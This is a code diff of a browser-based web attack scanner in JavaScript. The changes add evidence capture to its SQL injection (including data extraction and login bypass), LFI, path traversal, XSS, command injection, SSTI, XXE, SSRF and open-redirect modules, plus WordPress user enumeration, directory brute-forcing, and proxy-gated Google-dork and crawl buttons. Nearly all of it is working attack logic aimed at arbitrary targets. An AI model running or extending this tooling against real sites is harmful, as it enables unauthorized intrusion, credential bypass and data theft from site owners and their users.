+      if (r.status === 200) { const isJson = r.headers['content-type'] && r.headers['content-type'].includes('json'); if (isJson && r.text.length > 10) { const ev = r.text.slice(0, 200); mlog('vuln', 'apiprobe', 'API exposes data: ' + url); mAddFinding('apiprobe', { url: url, issue: 'Unauthenticated API response', evidence: ev }); } else mlog('info', 'apiprobe', '[200] ' + url); }
       else if (r.status === 401 || r.status === 403) mlog('info', 'apiprobe', '[' + r.status + '] Protected: ' + url);
-      else if (r.status === 405) { mlog('info', 'apiprobe', '[405] Exists: ' + url); mAddFinding('apiprobe', { url: url, issue: 'Endpoint exists (405)' }); }
+      else if (r.status === 405) { mlog('info', 'apiprobe', '[405] Exists: ' + url); mAddFinding('apiprobe', { url: url, issue: 'Endpoint exists', evidence: 'HTTP 405 on ' + path }); }
     } catch (e) { if (e.name === 'AbortError') throw e; }
   }, getConc());
   setModStatus('apiprobe', 'done');
@@ -2520,7 +2642,7 @@ async function runSensitiveFiles(target) {
     const url = target + file; modCheckAbort();
     try {
       const r = await httpMod(url);
-      if (r.status === 200) { mlog('vuln', 'sensitivefiles', '[200] Exposed: ' + url); mAddFinding('sensitivefiles', { url: url, status: 200, issue: 'Sensitive file exposed' }); }
+      if (r.status === 200) { const ev = r.text.slice(0, 200); mlog('vuln', 'sensitivefiles', '[200] Exposed: ' + url); mAddFinding('sensitivefiles', { url: url, status: 200, issue: 'Sensitive file exposed', evidence: ev }); }
       else if (r.status === 403) mlog('info', 'sensitivefiles', '[403] Forbidden: ' + url);
     } catch (e) { if (e.name === 'AbortError') throw e; }
   }, getConc());
@@ -2537,7 +2659,7 @@ async function runDirbust(target) {
     try {
       const r = await httpMod(url);
       if (r.status === 404 || r.status === 410) return;
-      found.add(url); mAddFinding('dirbust', { url: url, status: r.status, issue: 'Path found: ' + dir });
+      found.add(url); mAddFinding('dirbust', { url: url, status: r.status, issue: 'Path found', evidence: 'HTTP ' + r.status + ' -> ' + dir });
       const suf = r.redirected && r.finalUrl && r.finalUrl !== url ? ' -> ' + r.finalUrl : '';
       mlog('dir', 'dirbust', '[' + r.status + '] ' + url + suf);
     } catch (e) { if (e.name === 'AbortError') throw e; }
@@ -2564,7 +2686,7 @@ async function runModuleCrawler(target) {
   };
   await fetchLinks(target);
   if (urls.size < 25) { const extra = [...urls].slice(0, 15); for (const u of extra) { modCheckAbort(); await fetchLinks(u).catch(() => {}); } }
-  for (const u of urls) { mlog('crawl', 'crawler', u); mAddFinding('crawler', { url: u }); }
+  for (const u of urls) { mlog('crawl', 'crawler', u); mAddFinding('crawler', { url: u, issue: 'URL discovered', evidence: u }); }
   mlog('ok', 'crawler', 'Found ' + urls.size + ' URLs');
   setModStatus('crawler', 'done');
   return urls;
@@ -2581,7 +2703,11 @@ async function runOpenRedirect(target) {
       try {
         const r = await httpMod(testUrl);
         const loc = r.headers['location'] || '';
-        if (loc.includes('evil.com') || (r.finalUrl && r.finalUrl.includes('evil.com'))) { mlog('vuln', 'openredirect', 'Open redirect [' + param + ']: ' + testUrl); mAddFinding('openredirect', { url: testUrl, param: param, payload: pay, issue: 'Open redirect' }); break; }
+        if (loc.includes('evil.com') || (r.finalUrl && r.finalUrl.includes('evil.com'))) {
+          mlog('vuln', 'openredirect', 'Open redirect [' + param + ']: ' + testUrl);
+          mAddFinding('openredirect', { url: testUrl, param: param, payload: pay, issue: 'Open redirect', evidence: 'Location: ' + loc });
+          break;
+        }
       } catch (e) { if (e.name === 'AbortError') throw e; }
     }
   }
@@ -2598,7 +2724,13 @@ async function runSSRFModule(target) {
       const testUrl = base + '?' + param + '=' + encodeURIComponent(pay);
       try {
         const r = await httpMod(testUrl);
-        if (r.status === 200 && SSRF_SIGNS.some(s => r.text.includes(s))) { mlog('vuln', 'ssrf', 'SSRF [' + param + ']: ' + testUrl); mAddFinding('ssrf', { url: testUrl, param: param, payload: pay, issue: 'SSRF confirmed' }); break; }
+        const sig = SSRF_SIGNS.find(s => r.text.includes(s));
+        if (r.status === 200 && sig) {
+          const ev = grabAround(r.text, sig);
+          mlog('vuln', 'ssrf', 'SSRF [' + param + ']');
+          mAddFinding('ssrf', { url: testUrl, param: param, payload: pay, issue: 'SSRF confirmed', evidence: ev });
+          break;
+        }
       } catch (e) { if (e.name === 'AbortError') throw e; }
     }
   }
@@ -2615,12 +2747,12 @@ async function testSQLiErrorBased(base, pn, baselineText) {
     try {
       const r = await httpMod(key + '=' + encodeURIComponent(pay));
       const low = (r.text || '').toLowerCase();
-      for (const e of Object.entries(SQLI_ERR)) {
-        const dbms = e[0], sigs = e[1];
+      for (const [dbms, sigs] of Object.entries(SQLI_ERR)) {
         for (const sig of sigs) {
           if (low.includes(sig) && !(baselineText && baselineText.toLowerCase().includes(sig))) {
-            mlog('vuln', 'sqli', '[ERROR][' + dbms + '] param=[' + pn + '] sig="' + sig + '"');
-            mAddFinding('sqli', { technique: 'error-based', dbms: dbms, url: key + '=' + encodeURIComponent(pay), param: pn, payload: pay, sig: sig });
+            const ev = grabAround(r.text, sig);
+            mlog('vuln', 'sqli', '[ERROR][' + dbms + '] param=[' + pn + '] :: ' + trunc(ev, 80));
+            mAddFinding('sqli', { technique: 'error-based', dbms: dbms, url: key + '=' + encodeURIComponent(pay), param: pn, payload: pay, sig: sig, issue: 'SQLi error-based', evidence: ev });
             return { found: true, dbms: dbms };
           }
         }
@@ -2635,7 +2767,7 @@ async function testSQLiErrorExtract(base, pn, dbms) {
   mlog('info', 'sqli', '[EXTRACT] param=[' + pn + '] dbms=' + dbms);
   for (const pay of SQLI_EXTRACT) {
     modCheckAbort();
-    try { const r = await httpMod(key + '=' + encodeURIComponent(pay)); const m = (r.text || '').match(/~([^~]{3,80})~/); if (m) { mlog('vuln', 'sqli', '[EXTRACT] ' + m[1]); mAddFinding('sqli', { technique: 'extract', dbms: dbms, url: key, param: pn, extracted: m[1] }); return; } } catch (e) { if (e.name === 'AbortError') throw e; }
+    try { const r = await httpMod(key + '=' + encodeURIComponent(pay)); const m = (r.text || '').match(/XPATH syntax error:\s*'~([^'~]{2,120})~/i) || (r.text || '').match(/~([^~]{3,80})~/); if (m) { const ev = m[0]; mlog('vuln', 'sqli', '[EXTRACT] ' + trunc(ev, 100)); mAddFinding('sqli', { technique: 'extract', dbms: dbms, url: key, param: pn, issue: 'SQLi extract', evidence: ev }); return; } } catch (e) { if (e.name === 'AbortError') throw e; }
   }
 }
 
@@ -2649,7 +2781,7 @@ async function testSQLiBooleanBlind(base, pn) {
       const rF = await httpMod(key + '=' + encodeURIComponent(falseP)).catch(() => null);
       if (!rT || !rF) continue;
       const diff = Math.abs(rT.text.length - rF.text.length);
-      if (diff > 50 || rT.status !== rF.status) { mlog('vuln', 'sqli', '[BOOLEAN] param=[' + pn + '] diff=' + diff); mAddFinding('sqli', { technique: 'boolean-blind', url: key, param: pn, diff: diff }); return true; }
+      if (diff > 50 || rT.status !== rF.status) { const ev = 'len_true=' + rT.text.length + ' len_false=' + rF.text.length + ' diff=' + diff; mlog('vuln', 'sqli', '[BOOLEAN] param=[' + pn + '] ' + ev); mAddFinding('sqli', { technique: 'boolean-blind', url: key, param: pn, issue: 'SQLi boolean-blind', evidence: ev }); return true; }
     } catch (e) { if (e.name === 'AbortError') throw e; }
   }
   return false;
@@ -2660,7 +2792,7 @@ async function testSQLiTimeBased(base, pn) {
   for (const test of SQLI_TIME) {
     modCheckAbort();
     const t0 = performance.now();
-    try { await httpMod(key + '=' + encodeURIComponent(test.pay)); const dt = performance.now() - t0; if (dt >= test.thresh) { mlog('vuln', 'sqli', '[TIME][' + test.dbms + '] ' + dt.toFixed(0) + 'ms'); mAddFinding('sqli', { technique: 'time-based', dbms: test.dbms, url: key, param: pn, payload: test.pay, elapsed: dt }); return true; } } catch (e) { if (e.name === 'AbortError') throw e; }
+    try { await httpMod(key + '=' + encodeURIComponent(test.pay)); const dt = performance.now() - t0; if (dt >= test.thresh) { const ev = 'dbms=' + test.dbms + ' elapsed=' + dt.toFixed(0) + 'ms'; mlog('vuln', 'sqli', '[TIME][' + test.dbms + '] ' + dt.toFixed(0) + 'ms'); mAddFinding('sqli', { technique: 'time-based', dbms: test.dbms, url: key, param: pn, payload: test.pay, elapsed: dt, issue: 'SQLi time-based', evidence: ev }); return true; } } catch (e) { if (e.name === 'AbortError') throw e; }
   }
   return false;
 }
@@ -2674,8 +2806,9 @@ async function testSQLiUnion(base, pn) {
       const r = await httpMod(key + '=0' + encodeURIComponent(pay));
       const low = (r.text || '').toLowerCase();
       if (!low.includes('column') && !low.includes('operand') && r.status === 200 && r.text.length > 0) {
+        const ev = 'columns=' + cols + ' payload=' + pay;
         mlog('vuln', 'sqli', '[UNION] ' + cols + '-col');
-        mAddFinding('sqli', { technique: 'union', url: key, param: pn, columns: cols });
+        mAddFinding('sqli', { technique: 'union', url: key, param: pn, columns: cols, issue: 'SQLi union', evidence: ev });
         return true;
       }
     } catch (e) { if (e.name === 'AbortError') throw e; }
@@ -2715,8 +2848,8 @@ async function testSQLiAuthBypass(target) {
           try {
             const rp = await httpMod(url, { method: 'POST', body: body, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
             const low = (rp.text || '').toLowerCase();
-            if (rp.finalUrl && /dashboard|admin|profile/i.test(rp.finalUrl)) { mlog('vuln', 'sqli', '[AUTH-BYPASS] at ' + url + ' user=' + up); mAddFinding('sqli', { technique: 'auth-bypass', url: url, payload: up + ':' + pp }); return; }
-            if (low.includes('welcome') || low.includes('logout') || low.includes('dashboard')) { mlog('vuln', 'sqli', '[AUTH-BYPASS] keyword: ' + url); mAddFinding('sqli', { technique: 'auth-bypass', url: url, payload: up + ':' + pp }); }
+            if (rp.finalUrl && /dashboard|admin|profile/i.test(rp.finalUrl)) { const ev = 'user=' + up + ' pass=' + pp + ' -> ' + rp.finalUrl; mlog('vuln', 'sqli', '[AUTH-BYPASS] at ' + url); mAddFinding('sqli', { technique: 'auth-bypass', url: url, issue: 'SQLi auth bypass', evidence: ev }); return; }
+            if (low.includes('welcome') || low.includes('logout') || low.includes('dashboard')) { const ev = 'user=' + up + ' pass=' + pp + ' (keyword match)'; mlog('vuln', 'sqli', '[AUTH-BYPASS] keyword: ' + url); mAddFinding('sqli', { technique: 'auth-bypass', url: url, issue: 'SQLi auth bypass', evidence: ev }); }
           } catch (e) { if (e.name === 'AbortError') throw e; }
         }
       }
@@ -2729,6 +2862,7 @@ async function testSQLi(url) {
   const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
   for (const param of params) {
     const pn = param.split('=')[0], key = base + '?' + pn;
+    if (SKIP_PARAMS.has(pn.toLowerCase())) continue;
     if (modTested.sqli.has(key)) continue; modTested.sqli.add(key);
     mlog('info', 'sqli', 'Testing param=[' + pn + ']');
     let baseline = null;
@@ -2746,10 +2880,11 @@ async function testSQLi(url) {
 async function runSQLi(testable) {
   setModStatus('sqli', 'running');
   mlog('info', 'sqli', 'SQLi engine: error | union | boolean | time | auth-bypass');
-  mlog('info', 'sqli', 'Testing ' + testable.length + ' URLs');
+  const filtered = testable.filter(u => !shouldSkipVuln(u));
+  mlog('info', 'sqli', 'Testing ' + filtered.length + ' URLs (' + (testable.length - filtered.length) + ' skipped as static)');
   modTested.sqli.clear();
-  for (let i = 0; i < testable.length; i++) { modCheckAbort(); await testSQLi(testable[i]); }
-  const target = testable.length > 0 ? testable[0].split('?')[0].replace(/\/[^/]*$/, '/') : '';
+  for (let i = 0; i < filtered.length; i++) { modCheckAbort(); await testSQLi(filtered[i]); }
+  const target = filtered.length > 0 ? filtered[0].split('?')[0].replace(/\/[^/]*$/, '/') : '';
   if (target) await testSQLiAuthBypass(target);
   const n = (modFindings.sqli || []).length;
   if (n > 0) mlog('vuln', 'sqli', n + ' SQLi finding(s)'); else mlog('ok', 'sqli', 'No SQLi');
@@ -2761,18 +2896,20 @@ async function testLFI(url) {
   const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
   for (const param of params) {
     const pn = param.split('=')[0], key = base + '?' + pn;
+    if (SKIP_PARAMS.has(pn.toLowerCase())) continue;
     if (modTested.lfi.has(key)) continue; modTested.lfi.add(key);
     for (const pay of LFI) {
       modCheckAbort();
-      try { const r = await httpMod(key + '=' + pay); if (LFI_SIGNS.some(s => (r.text || '').includes(s))) { mlog('vuln', 'lfi', 'LFI [' + pn + ']: ' + key); mAddFinding('lfi', { url: key + '=' + pay, param: pn, payload: pay }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
+      try { const r = await httpMod(key + '=' + pay); const sig = LFI_SIGNS.find(s => (r.text || '').includes(s)); if (sig) { const ev = grabAround(r.text, sig); mlog('vuln', 'lfi', 'LFI [' + pn + '] :: ' + trunc(ev, 80)); mAddFinding('lfi', { url: key + '=' + pay, param: pn, payload: pay, issue: 'LFI', evidence: ev }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
     }
   }
 }
 async function runLFI(testable) {
   setModStatus('lfi', 'running');
-  mlog('info', 'lfi', 'Testing ' + testable.length + ' URLs for LFI');
+  const filtered = testable.filter(u => !shouldSkipVuln(u));
+  mlog('info', 'lfi', 'Testing ' + filtered.length + ' URLs for LFI');
   modTested.lfi.clear();
-  for (let i = 0; i < testable.length; i++) { modCheckAbort(); await testLFI(testable[i]); }
+  for (let i = 0; i < filtered.length; i++) { modCheckAbort(); await testLFI(filtered[i]); }
   const n = (modFindings.lfi || []).length;
   if (n > 0) mlog('vuln', 'lfi', n + ' LFI finding(s)'); else mlog('ok', 'lfi', 'No LFI');
   setModStatus('lfi', 'done');
@@ -2780,17 +2917,19 @@ async function runLFI(testable) {
 
 async function runPathTraversal(testable) {
   setModStatus('pathtraversal', 'running');
-  mlog('info', 'pathtraversal', 'Testing ' + testable.length + ' URLs');
+  const filtered = testable.filter(u => !shouldSkipVuln(u));
+  mlog('info', 'pathtraversal', 'Testing ' + filtered.length + ' URLs');
   const tested = new Set();
-  for (const url of testable) {
+  for (const url of filtered) {
     const qi = url.indexOf('?'); if (qi === -1) continue;
     const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
     for (const param of params) {
       const pn = param.split('=')[0], key = base + '?' + pn;
+      if (SKIP_PARAMS.has(pn.toLowerCase())) continue;
       if (tested.has(key)) continue; tested.add(key);
       for (const pay of PATH_TRAV) {
         modCheckAbort();
-        try { const r = await httpMod(key + '=' + pay); if (LFI_SIGNS.some(s => (r.text || '').includes(s))) { mlog('vuln', 'pathtraversal', 'PathTrav [' + pn + ']: ' + key); mAddFinding('pathtraversal', { url: key + '=' + pay, param: pn, payload: pay }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
+        try { const r = await httpMod(key + '=' + pay); const sig = LFI_SIGNS.find(s => (r.text || '').includes(s)); if (sig) { const ev = grabAround(r.text, sig); mlog('vuln', 'pathtraversal', 'PathTrav [' + pn + '] :: ' + trunc(ev, 80)); mAddFinding('pathtraversal', { url: key + '=' + pay, param: pn, payload: pay, issue: 'Path traversal', evidence: ev }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
       }
     }
   }
@@ -2805,20 +2944,22 @@ async function testXSS(url) {
   const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
   for (const param of params) {
     const pn = param.split('=')[0], key = base + '?' + pn;
+    if (SKIP_PARAMS.has(pn.toLowerCase())) continue;
     if (modTested.xss.has(key)) continue; modTested.xss.add(key);
     const tok = randToken(10);
     for (const tmpl of XSS_TPL) {
       modCheckAbort();
       const pay = tmpl.replace(/PAYLOAD/g, tok);
-      try { const r = await httpMod(key + '=' + encodeURIComponent(pay)); if ((r.text || '').includes(tok)) { mlog('vuln', 'xss', 'XSS [' + pn + '] token=' + tok); mAddFinding('xss', { url: key, param: pn, tok: tok, payload: pay }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
+      try { const r = await httpMod(key + '=' + encodeURIComponent(pay)); if ((r.text || '').includes(tok)) { const ev = grabAround(r.text, tok, 50); mlog('vuln', 'xss', 'XSS [' + pn + '] token=' + tok + ' :: ' + trunc(ev, 80)); mAddFinding('xss', { url: key, param: pn, tok: tok, payload: pay, issue: 'XSS reflected', evidence: ev }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
     }
   }
 }
 async function runXSS(testable) {
   setModStatus('xss', 'running');
-  mlog('info', 'xss', 'Testing ' + testable.length + ' URLs for XSS');
+  const filtered = testable.filter(u => !shouldSkipVuln(u));
+  mlog('info', 'xss', 'Testing ' + filtered.length + ' URLs for XSS');
   modTested.xss.clear();
-  for (let i = 0; i < testable.length; i++) { modCheckAbort(); await testXSS(testable[i]); }
+  for (let i = 0; i < filtered.length; i++) { modCheckAbort(); await testXSS(filtered[i]); }
   const n = (modFindings.xss || []).length;
   if (n > 0) mlog('vuln', 'xss', n + ' XSS finding(s)'); else mlog('ok', 'xss', 'No XSS');
   setModStatus('xss', 'done');
@@ -2826,17 +2967,19 @@ async function runXSS(testable) {
 
 async function runCMDi(testable) {
   setModStatus('cmdi', 'running');
-  mlog('info', 'cmdi', 'Testing ' + testable.length + ' URLs');
+  const filtered = testable.filter(u => !shouldSkipVuln(u));
+  mlog('info', 'cmdi', 'Testing ' + filtered.length + ' URLs');
   const tested = new Set();
-  for (const url of testable) {
+  for (const url of filtered) {
     const qi = url.indexOf('?'); if (qi === -1) continue;
     const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
     for (const param of params) {
       const pn = param.split('=')[0], key = base + '?' + pn;
+      if (SKIP_PARAMS.has(pn.toLowerCase())) continue;
       if (tested.has(key)) continue; tested.add(key);
       for (const pay of CMDI) {
         modCheckAbort();
-        try { const r = await httpMod(key + '=' + encodeURIComponent(pay)); const body = r.text || ''; const hit = CMDI_SIGNS.find(s => matchSign(body, s)); if (hit) { const evidence = hit instanceof RegExp ? (body.match(hit) || [''])[0] : hit; mlog('vuln', 'cmdi', 'CMDi [' + pn + '] evidence=' + trunc(evidence, 40)); mAddFinding('cmdi', { url: key, param: pn, payload: pay, evidence: evidence }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
+        try { const r = await httpMod(key + '=' + encodeURIComponent(pay)); const body = r.text || ''; const hit = CMDI_SIGNS.find(s => matchSign(body, s)); if (hit) { const ev = hit instanceof RegExp ? (body.match(hit) || [''])[0] : grabAround(body, hit); mlog('vuln', 'cmdi', 'CMDi [' + pn + '] :: ' + trunc(ev, 60)); mAddFinding('cmdi', { url: key, param: pn, payload: pay, issue: 'CMDi', evidence: ev }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
       }
     }
   }
@@ -2847,18 +2990,20 @@ async function runCMDi(testable) {
 
 async function runSSTI(testable) {
   setModStatus('ssti', 'running');
-  mlog('info', 'ssti', 'Testing ' + testable.length + ' URLs');
+  const filtered = testable.filter(u => !shouldSkipVuln(u));
+  mlog('info', 'ssti', 'Testing ' + filtered.length + ' URLs');
   const tested = new Set();
-  for (const url of testable) {
+  for (const url of filtered) {
     const qi = url.indexOf('?'); if (qi === -1) continue;
     const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
     for (const param of params) {
       const pn = param.split('=')[0], key = base + '?' + pn;
+      if (SKIP_PARAMS.has(pn.toLowerCase())) continue;
       if (tested.has(key)) continue; tested.add(key);
       for (const pair of SSTI) {
         modCheckAbort();
         const pay = pair[0], expected = pair[1];
-        try { const r = await httpMod(key + '=' + encodeURIComponent(pay)); if ((r.text || '').includes(expected) && !(r.text || '').includes(pay)) { mlog('vuln', 'ssti', 'SSTI [' + pn + '] "' + pay + '" -> "' + expected + '"'); mAddFinding('ssti', { url: key, param: pn, payload: pay, expected: expected }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
+        try { const r = await httpMod(key + '=' + encodeURIComponent(pay)); const body = r.text || ''; if (body.includes(expected) && !body.includes(pay)) { const ev = pay + ' => ' + grabAround(body, expected, 40); mlog('vuln', 'ssti', 'SSTI [' + pn + '] :: ' + trunc(ev, 80)); mAddFinding('ssti', { url: key, param: pn, payload: pay, expected: expected, issue: 'SSTI', evidence: ev }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
       }
     }
   }
@@ -2869,19 +3014,21 @@ async function runSSTI(testable) {
 
 async function runXXE(testable) {
   setModStatus('xxe', 'running');
-  mlog('info', 'xxe', 'Probing ' + testable.length + ' URLs');
+  const filtered = testable.filter(u => !shouldSkipVuln(u));
+  mlog('info', 'xxe', 'Probing ' + filtered.length + ' URLs');
   const tested = new Set();
-  for (const url of testable) {
+  for (const url of filtered) {
     const qi = url.indexOf('?'); if (qi === -1) continue;
     const base = url.slice(0, qi), params = url.slice(qi + 1).split('&');
     for (const param of params) {
       const pn = param.split('=')[0], key = base + '?' + pn;
+      if (SKIP_PARAMS.has(pn.toLowerCase())) continue;
       if (tested.has(key)) continue; tested.add(key);
       for (const pair of [[XXE_PAY_FILE, 'file-read'], [XXE_PAY_OOB, 'oob-ssrf']]) {
         for (const ct of ['application/xml', 'text/xml']) {
           modCheckAbort();
           const xxeBody = pair[0], label = pair[1];
-          try { const r = await httpMod(key, { method: 'POST', body: xxeBody, headers: { 'Content-Type': ct } }); const ev = LFI_SIGNS.find(s => (r.text || '').includes(s)) || SSRF_SIGNS.find(s => (r.text || '').includes(s)); if (ev) { mlog('vuln', 'xxe', 'XXE (' + label + ') [' + pn + ']'); mAddFinding('xxe', { url: key, param: pn, payload: label }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
+          try { const r = await httpMod(key, { method: 'POST', body: xxeBody, headers: { 'Content-Type': ct } }); const lfiHit = LFI_SIGNS.find(s => (r.text || '').includes(s)); const ssrfHit = SSRF_SIGNS.find(s => (r.text || '').includes(s)); const sig = lfiHit || ssrfHit; if (sig) { const ev = grabAround(r.text, sig); mlog('vuln', 'xxe', 'XXE (' + label + ') [' + pn + '] :: ' + trunc(ev, 80)); mAddFinding('xxe', { url: key, param: pn, payload: label, issue: 'XXE', evidence: ev }); break; } } catch (e) { if (e.name === 'AbortError') throw e; }
         }
       }
     }
@@ -2907,7 +3054,7 @@ async function runCSRF(testable) {
         if (method !== 'POST') continue;
         const inputs = [...form.querySelectorAll('input')];
         const hasCsrf = inputs.some(i => { const n = (i.getAttribute('name') || '').toLowerCase(); return n.includes('csrf') || n.includes('token') || n.includes('nonce'); });
-        if (!hasCsrf) { mlog('vuln', 'csrf', 'POST form w/o CSRF: ' + base); mAddFinding('csrf', { url: base, issue: 'POST form missing CSRF' }); }
+        if (!hasCsrf) { mlog('vuln', 'csrf', 'POST form w/o CSRF: ' + base); mAddFinding('csrf', { url: base, issue: 'POST form missing CSRF', evidence: 'action=' + (form.getAttribute('action') || base) }); }
       }
     } catch (e) { if (e.name === 'AbortError') throw e; }
   }
@@ -2933,8 +3080,8 @@ async function runJWT(testable) {
           const hdr = JSON.parse(atob(pad(parts[0]).replace(/-/g, '+').replace(/_/g, '/')));
           const pay = JSON.parse(atob(pad(parts[1]).replace(/-/g, '+').replace(/_/g, '/')));
           mlog('info', 'jwt', 'JWT found: ' + url);
-          if (hdr.alg === 'none' || hdr.alg === 'NONE') { mlog('vuln', 'jwt', 'alg=none: ' + url); mAddFinding('jwt', { url: url, issue: 'JWT alg:none' }); }
-          if (!pay.exp) { mlog('vuln', 'jwt', 'JWT missing exp: ' + url); mAddFinding('jwt', { url: url, issue: 'JWT missing exp' }); }
+          if (hdr.alg === 'none' || hdr.alg === 'NONE') { mlog('vuln', 'jwt', 'alg=none: ' + url); mAddFinding('jwt', { url: url, issue: 'JWT alg:none', evidence: 'header: ' + JSON.stringify(hdr) }); }
+          if (!pay.exp) { mlog('vuln', 'jwt', 'JWT missing exp: ' + url); mAddFinding('jwt', { url: url, issue: 'JWT missing exp', evidence: 'payload: ' + JSON.stringify(pay) }); }
         } catch (pe) {}
       }
     } catch (e) { if (e.name === 'AbortError') throw e; }
@@ -2953,11 +3100,11 @@ async function runWordPress(target) {
   for (const entry of WP_VULNS) {
     modCheckAbort();
     const url = target + entry.path;
-    try { const r = await httpMod(url); if (entry.check(r)) { mlog('vuln', 'wordpress', entry.msg + ' | ' + url); mAddFinding('wordpress', { url: url, issue: entry.msg }); isWP = true; } } catch (e) { if (e.name === 'AbortError') throw e; }
+    try { const r = await httpMod(url); if (entry.check(r)) { const ev = grabAround(r.text, entry.msg.split(' ')[0], 40) || r.text.slice(0, 160); mlog('vuln', 'wordpress', entry.msg + ' | ' + url); mAddFinding('wordpress', { url: url, issue: entry.msg, evidence: ev }); isWP = true; } } catch (e) { if (e.name === 'AbortError') throw e; }
   }
   for (const eu of [target + 'wp-json/wp/v2/users', target + '?author=1']) {
     modCheckAbort();
-    try { const r = await httpMod(eu); if (r.status === 200 && ((r.text || '').includes('"slug"') || (r.text || '').includes('"name"'))) { mlog('vuln', 'wordpress', 'User enum: ' + eu); mAddFinding('wordpress', { url: eu, issue: 'User enumeration' }); } } catch (e) { if (e.name === 'AbortError') throw e; }
+    try { const r = await httpMod(eu); if (r.status === 200 && ((r.text || '').includes('"slug"') || (r.text || '').includes('"name"'))) { const ev = (r.text || '').slice(0, 200); mlog('vuln', 'wordpress', 'User enum: ' + eu); mAddFinding('wordpress', { url: eu, issue: 'User enumeration', evidence: ev }); } } catch (e) { if (e.name === 'AbortError') throw e; }
   }
   mlog('info', 'wordpress', 'Scanning plugins');
   const concPlugin = getConc();
@@ -2966,7 +3113,7 @@ async function runWordPress(target) {
     await Promise.all(pluginItems.slice(i, i + concPlugin).map(async plugin => {
       modCheckAbort();
       const url = target + 'wp-content/plugins/' + plugin + '/readme.txt';
-      try { const r = await httpMod(url); if (r.status === 200) { const vm = (r.text || '').match(/stable tag:\s*([\d.]+)/i); const ver = vm ? vm[1] : '?'; mlog('vuln', 'wordpress', 'Plugin: ' + plugin + ' v' + ver); mAddFinding('wordpress', { url: url, issue: 'Plugin: ' + plugin + ' v' + ver }); } } catch (e) { if (e.name === 'AbortError') throw e; }
+      try { const r = await httpMod(url); if (r.status === 200) { const vm = (r.text || '').match(/stable tag:\s*([\d.]+)/i); const ver = vm ? vm[1] : '?'; const ev = 'plugin=' + plugin + ' version=' + ver; mlog('vuln', 'wordpress', 'Plugin: ' + plugin + ' v' + ver); mAddFinding('wordpress', { url: url, issue: 'Plugin detected', evidence: ev }); } } catch (e) { if (e.name === 'AbortError') throw e; }
     }));
   }
   for (const theme of WP_COMMON_THEMES.slice(0, 15)) {
@@ -2995,7 +3142,7 @@ async function runWooCommerce(target) {
   for (const c of checks) {
     modCheckAbort();
     const url = target + c.path;
-    try { const r = await httpMod(url); if (c.check(r)) { mlog('vuln', 'woocommerce', c.msg + ' | ' + url); mAddFinding('woocommerce', { url: url, issue: c.msg }); isWoo = true; } } catch (e) { if (e.name === 'AbortError') throw e; }
+    try { const r = await httpMod(url); if (c.check(r)) { const ev = (r.text || '').slice(0, 200); mlog('vuln', 'woocommerce', c.msg + ' | ' + url); mAddFinding('woocommerce', { url: url, issue: c.msg, evidence: ev }); isWoo = true; } } catch (e) { if (e.name === 'AbortError') throw e; }
   }
   const n = (modFindings.woocommerce || []).length;
   if (n > 0) mlog('vuln', 'woocommerce', n + ' issue(s)'); else mlog(isWoo ? 'info' : 'ok', 'woocommerce', isWoo ? 'Woo detected' : 'No WooCommerce');
@@ -3004,7 +3151,7 @@ async function runWooCommerce(target) {
 
 /* ===== MODULES ===== */
 const MODULES = [
-  { id: 'crawler', name: 'Crawler', desc: 'Link discovery', run: async t => { const urls = await runModuleCrawler(t); _testableModUrls = [...urls].filter(u => u.includes('?')); } },
+  { id: 'crawler', name: 'Crawler', desc: 'Link discovery', run: async t => { const urls = await runModuleCrawler(t); _testableModUrls = [...urls].filter(u => u.includes('?') && !shouldSkipVuln(u)); } },
   { id: 'dirbust', name: 'DirBuster', desc: 'Directory brute-force', run: t => runDirbust(t) },
   { id: 'sensitivefiles', name: 'Sensitive Files', desc: 'Exposed file check', run: t => runSensitiveFiles(t) },
   { id: 'headers', name: 'Security Headers', desc: 'HTTP security headers', run: t => runHeaders(t) },
@@ -3037,7 +3184,7 @@ async function ensureTestable(target) {
   if (_testableModUrls.length > 0) return;
   mlog('warn', 'system', 'No testable URLs - auto-crawling');
   const urls = await runModuleCrawler(target);
-  _testableModUrls = [...urls].filter(u => u.includes('?'));
+  _testableModUrls = [...urls].filter(u => u.includes('?') && !shouldSkipVuln(u));
 }
 
 /* ===== UI ===== */
@@ -3051,6 +3198,20 @@ function updateProgress(pct, txt) {
 function updateModuleProgress(pct) { const f = $('moduleFill'); if (f) f.style.width = Math.max(0, Math.min(100, pct)) + '%'; }
 function toast(m) { const t = $('toast'); t.textContent = m; t.classList.add('show'); clearTimeout(toast._t); toast._t = setTimeout(() => t.classList.remove('show'), 1600); }
 
+function updateScanButtons() {
+  const blocked = !proxyReady;
+  const note = $('blockedNote');
+  if (note) note.classList.toggle('show', blocked);
+  // Keep buttons visible but disabled if no proxies and workers are alive.
+  ['crawlGo','dorkGo','btnRunAll','scanFiles'].forEach(id => {
+    const el = $(id);
+    if (!el) return;
+    if (el.dataset.userDisabled === '1') return;
+    if (blocked && id !== 'scanFiles') { el.disabled = true; }
+    else if (!el.disabled || el.dataset.proxyReenabled === '1') { el.disabled = false; el.dataset.proxyReenabled = ''; }
+  });
+}
+
 $$('#seg button').forEach(b => b.addEventListener('click', () => {
   $$('#seg button').forEach(x => x.classList.toggle('on', x === b));
   $$('.tab').forEach(t => t.classList.toggle('on', t.id === 'tab-' + b.dataset.tab));
@@ -3063,16 +3224,26 @@ let runningTask = false;
 function startTaskUI(btnId, label) {
   runningTask = true; abortFlag = false; setPaused(false);
   setLive('on', label);
-  const btn = $(btnId); if (btn) { btn.disabled = true; btn.innerHTML = '<span class="spin"></span>running'; }
